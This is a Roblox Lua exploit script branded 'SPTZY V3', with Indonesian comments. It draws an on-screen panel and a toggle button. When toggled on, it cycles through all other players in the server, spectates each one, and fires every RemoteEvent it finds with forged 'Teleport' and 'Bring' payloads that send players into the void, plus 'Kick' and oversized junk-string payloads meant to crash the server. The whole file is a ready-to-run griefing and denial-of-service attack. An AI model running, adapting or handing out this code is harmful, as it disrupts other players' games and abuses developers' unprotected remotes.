local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Konfigurasi Posisi Teleport (Void / Sangat Jauh)
local TP_LOCATION = CFrame.new(0, -5000, 0) 

-- Fungsi Notifikasi
local function sendRobloxNotif(title, text)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = title;
            Text = text;
            Icon = "rbxassetid://6023454774";
            Duration = 3;
        })
    end)
end

-- Pembersihan UI
if LocalPlayer.PlayerGui:FindFirstChild("SptzyUltimateV3") then
    LocalPlayer.PlayerGui.SptzyUltimateV3:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SptzyUltimateV3"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer.PlayerGui

local isProcessing = false
local crashData = string.rep("SPTZY_VOID_", 1000)

---------------------------------------
-- 1. UI PROFILE & RAINBOW TITLE (SPTZY)
---------------------------------------
local function createProfileUI()
    local profileFrame = Instance.new("Frame")
    profileFrame.Size = UDim2.new(0, 260, 0, 120)
    profileFrame.Position = UDim2.new(1, -20, 0, 40)
    profileFrame.AnchorPoint = Vector2.new(1, 0)
    profileFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
    profileFrame.BorderSizePixel = 0
    profileFrame.Parent = screenGui

    Instance.new("UICorner", profileFrame).CornerRadius = UDim.new(0, 12)
    local stroke = Instance.new("UIStroke", profileFrame)
    stroke.Thickness = 2

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Text = "SPTZY"
    titleLabel.Position = UDim2.new(0, 15, 0, 10)
    titleLabel.Size = UDim2.new(0, 230, 0, 35)
    titleLabel.Font = Enum.Font.GothamBlack
    titleLabel.TextSize = 30
    titleLabel.BackgroundTransparency = 1
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = profileFrame

    task.spawn(function()
        local hue = 0
        while true do
            hue = hue + 0.01
            if hue > 1 then hue = 0 end
            local color = Color3.fromHSV(hue, 0.8, 1)
            titleLabel.TextColor3 = color
            stroke.Color = color
            task.wait()
        end
    end)

    local logLabel = Instance.new("TextLabel")
    logLabel.Name = "LogLabel"
    logLabel.Text = "Targeting: All Others"
    logLabel.Position = UDim2.new(0, 15, 0, 65)
    logLabel.Size = UDim2.new(0, 230, 0, 20)
    logLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    logLabel.Font = Enum.Font.Code
    logLabel.TextSize = 9
    logLabel.BackgroundTransparency = 1
    logLabel.TextXAlignment = Enum.TextXAlignment.Left
    logLabel.Parent = profileFrame
    
    local subLog = Instance.new("TextLabel")
    subLog.Name = "SubLog"
    subLog.Text = "Mode: Crash + TP + Spectate"
    subLog.Position = UDim2.new(0, 15, 0, 85)
    subLog.Size = UDim2.new(0, 230, 0, 20)
    subLog.TextColor3 = Color3.fromRGB(200, 200, 200)
    subLog.Font = Enum.Font.Gotham
    subLog.TextSize = 10
    subLog.BackgroundTransparency = 1
    subLog.TextXAlignment = Enum.TextXAlignment.Left
    subLog.Parent = profileFrame
end

---------------------------------------
-- 2. LOGIKA CRASH + TP + SPECTATE
---------------------------------------
local function startUltimateV3()
    task.spawn(function()
        local logLabel = screenGui:FindFirstChild("LogLabel", true)
        
        while isProcessing do
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Humanoid") then
                    
                    -- Update Camera (Spectate)
                    Camera.CameraSubject = player.Character.Humanoid
                    if logLabel then logLabel.Text = "Annihilating: " .. player.DisplayName end
                    
                    -- Scan Remotes
                    for _, remote in pairs(game:GetDescendants()) do
                        if not isProcessing then break end
                        if remote:IsA("RemoteEvent") then
                            pcall(function()
                                -- Payload 1: Teleport (Mencoba paksa posisi server)
                                remote:FireServer("Teleport", player, TP_LOCATION)
                                remote:FireServer("Bring", player, TP_LOCATION)
                                remote:FireServer("UpdateCharacter", {CFrame = TP_LOCATION})
                                
                                -- Payload 2: Crash/Overload
                                remote:FireServer("Kick", player, crashData)
                                remote:FireServer(player, crashData, crashData)
                            end)
                        end
                    end
                    task.wait(1) -- Kecepatan siklus spectate/TP
                end
                if not isProcessing then break end
            end
        end
        
        -- Reset Kamera
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            Camera.CameraSubject = LocalPlayer.Character.Humanoid
        end
        if logLabel then logLabel.Text = "System: Idle" end
    end)
end

---------------------------------------
-- 3. TOGGLE BUTTON
---------------------------------------
local function createToggle()
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 260, 0, 45)
    btn.Position = UDim2.new(1, -20, 0, 170)
    btn.AnchorPoint = Vector2.new(1, 0)
    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    btn.Font = Enum.Font.GothamBold
    btn.Text = "EXECUTE SPTZY V3"
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.TextSize = 13
    btn.Parent = screenGui
    Instance.new("UICorner", btn)

    btn.MouseButton1Click:Connect(function()
        isProcessing = not isProcessing
        if isProcessing then
            btn.Text = "HALT SYSTEM"
            btn.BackgroundColor3 = Color3.fromRGB(180, 0, 50)
            sendRobloxNotif("SPTZY V3", "Mass Crash & Teleport Started")
            startUltimateV3()
        else
            btn.Text = "EXECUTE SPTZY V3"
            btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            sendRobloxNotif("SPTZY V3", "All processes stopped.")
        end
    end)
end

createProfileUI()
createToggle()
